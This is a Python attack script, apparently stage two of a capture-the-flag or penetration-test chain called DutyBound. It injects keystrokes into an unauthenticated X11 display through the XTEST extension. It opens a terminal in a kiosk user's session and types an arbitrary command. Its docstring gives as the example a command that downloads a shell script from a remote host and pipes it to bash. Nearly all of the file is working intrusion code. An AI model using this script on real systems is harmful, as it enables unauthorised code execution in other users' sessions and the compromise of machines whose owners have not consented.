#!/usr/bin/env python3
"""DutyBound — stage 2: inject keystrokes into an unauthenticated X11 display.

Uses libX11 + libXtst through ctypes (XTEST extension) so it needs no
xdotool and no Python packages on the target. Typical use from the postgres
shell:

    python3 x11inject.py --display :0 \
        --command 'curl -s http://10.10.14.95:8000/user.sh | bash'

It sends Ctrl+Alt+T, waits for the terminal, types the command and presses
Return — in the *kiosk user's* session, which is the point.
"""
import argparse
import ctypes
import ctypes.util
import sys
import time

# Character -> (keysym name, needs Shift)
CHARMAP = {
    "/": ("slash", False), " ": ("space", False), "&": ("ampersand", True),
    "|": ("bar", True), ">": ("greater", True), "<": ("less", True),
    "-": ("minus", False), ".": ("period", False), ":": ("colon", True),
    ";": ("semicolon", False), "'": ("apostrophe", False),
    '"': ("quotedbl", True), "!": ("exclam", True), "$": ("dollar", True),
    "(": ("parenleft", True), ")": ("parenright", True), "=": ("equal", False),
    "~": ("asciitilde", True), "@": ("at", True), "#": ("numbersign", True),
    "%": ("percent", True), "^": ("asciicircum", True), "*": ("asterisk", True),
    "_": ("underscore", True), "+": ("plus", True), "{": ("braceleft", True),
    "}": ("braceright", True), "?": ("question", True), ",": ("comma", False),
    "\\": ("backslash", False), "[": ("bracketleft", False),
    "]": ("bracketright", False), "`": ("grave", False), "\n": ("Return", False),
}
MODIFIERS = {"ctrl": "Control_L", "alt": "Alt_L", "shift": "Shift_L",
             "super": "Super_L"}

class X:
    def __init__(self, display: bytes):
        self.x11 = ctypes.CDLL(ctypes.util.find_library("X11"))
        self.xtst = ctypes.CDLL(ctypes.util.find_library("Xtst"))

        self.x11.XOpenDisplay.restype = ctypes.c_void_p
        self.x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
        self.x11.XStringToKeysym.restype = ctypes.c_ulong
        self.x11.XStringToKeysym.argtypes = [ctypes.c_char_p]
        self.x11.XKeysymToKeycode.restype = ctypes.c_ubyte
        self.x11.XKeysymToKeycode.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
        self.x11.XFlush.argtypes = [ctypes.c_void_p]
        self.xtst.XTestFakeKeyEvent.argtypes = [
            ctypes.c_void_p, ctypes.c_uint, ctypes.c_int, ctypes.c_ulong]

        self.dpy = self.x11.XOpenDisplay(display)
        if not self.dpy:
            sys.exit("[-] cannot open display %s" % display.decode())

    def keycode(self, name: str):
        ks = self.x11.XStringToKeysym(name.encode())
        if not ks:
            raise KeyError(name)
        return self.x11.XKeysymToKeycode(self.dpy, ks)

    def event(self, code, press: bool) -> None:
        self.xtst.XTestFakeKeyEvent(self.dpy, code, 1 if press else 0, 0)
        self.x11.XFlush(self.dpy)

    def tap(self, name: str, shift: bool = False) -> None:
        code = self.keycode(name)
        sh = self.keycode("Shift_L") if shift else None
        if sh:
            self.event(sh, True)
        self.event(code, True)
        self.event(code, False)
        if sh:
            self.event(sh, False)

    def chord(self, *names: str) -> None:
        codes = [self.keycode(n) for n in names]
        for c in codes:
            self.event(c, True)
        for c in reversed(codes):
            self.event(c, False)

    def type(self, text: str, delay: float) -> None:
        for ch in text:
            if ch.isalpha():
                self.tap(ch.lower(), ch.isupper())
            elif ch.isdigit():
                self.tap(ch)
            elif ch in CHARMAP:
                name, shift = CHARMAP[ch]
                self.tap(name, shift)
            else:
                sys.stderr.write("[!] skipping unsupported char %r\n" % ch)
            time.sleep(delay)

def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--display", default=":0")
    ap.add_argument("--keyseq", default="ctrl+alt+t",
                    help="modifier chord to open a terminal (default ctrl+alt+t)")
    ap.add_argument("--command", required=True, help="command to type")
    ap.add_argument("--wait", type=float, default=3.0,
                    help="seconds to wait for the terminal window (default 3)")
    ap.add_argument("--delay", type=float, default=0.03,
                    help="per-character delay (default 0.03)")
    ap.add_argument("--no-enter", action="store_true",
                    help="do not press Return after typing")
    args = ap.parse_args()

    parts = args.keyseq.split("+")
    mods = [MODIFIERS[p.lower()] for p in parts[:-1]]
    final = parts[-1]

    x = X(args.display.encode())
    x.chord(*mods, final)
    print("[*] sent %s; waiting %.1fs for the terminal" % (args.keyseq, args.wait))
    time.sleep(args.wait)

    x.type(args.command, args.delay)
    if not args.no_enter:
        time.sleep(0.4)
        x.tap("Return")
    x.x11.XFlush(x.dpy)
    print("[*] done")

if __name__ == "__main__":
    main()
